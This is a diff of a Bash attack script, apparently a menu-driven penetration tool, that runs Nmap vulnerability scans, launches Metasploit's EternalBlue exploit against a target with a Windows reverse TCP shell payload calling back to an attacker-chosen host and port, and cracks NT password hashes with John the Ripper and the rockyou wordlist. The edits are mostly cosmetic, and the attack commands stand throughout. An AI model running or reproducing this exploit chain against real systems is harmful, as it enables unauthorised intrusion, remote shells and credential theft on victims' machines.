@@ -226,7 +226,13 @@ sleep 1
      echo -e "\033[1;32mRunning Nmap (vuln scripts)...\033[0m"
     nmap -sV --script vuln "$rhost" -oN vuln_scan.txt
 
-    echo "[i] Scan complete. Saved to initial_scan.txt and vuln_scan.txt"
+   
+    echo -e "\033[1;36m============================================================\033[0m"
+sleep 0.5
+ echo "[i] Scan complete. Saved to initial_scan.txt and vuln_scan.txt"
+ sleep 0.5
+echo -e "\033[1;36m============================================================\033[0m"
+
         echo -e "\n\033[1;33m🚀 Launching EternalBlue Exploit...\033[0m"
 sleep 1
 echo -e "\033[1;32m[✓] Exploit may have succeeded! Checking...\033[0m"
@@ -280,7 +286,7 @@ echo -e "\033[1;36m------------------------------------------------------------\
 sleep 2
   msfconsole -q -x "
 use exploit/windows/smb/ms17_010_eternalblue;
-set RHOSTS $rhost;
+setg RHOSTS $rhost;
 set LHOST $lhost;
 set LPORT $lport;
 set PAYLOAD windows/x64/shell/reverse_tcp;
@@ -291,7 +297,7 @@ exploit -j;
 
     echo "[*] Cracking with rockyou.txt..."
     john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
-    john --show hash1.txt
+     john --show --format=NT hash1.txt > cracked-hash.txt
     sleep 5
     read -p $'\033[1;33m[*] Press Enter to return to the menu...\033[0m'
 }
